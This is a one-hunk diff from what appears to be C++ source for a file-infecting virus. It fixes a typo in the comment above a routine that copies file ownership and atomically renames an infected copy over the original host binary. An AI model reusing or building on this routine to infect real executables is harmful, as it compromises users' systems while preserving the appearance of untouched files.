@@ -69,7 +69,7 @@ bool atomic_swap_host(int host_fd, const char* host, int tmp_fd,
   if (vf::fchown(tmp_fd, s.st_uid, s.st_gid) < 0) {
     return false;
   }
-  // atomic swap and replace the orignal host with our infected one.
+  // atomic swap and replace the original host with our infected one.
   if (vf::rename(tmp, host) < 0) {
     return false;
   }
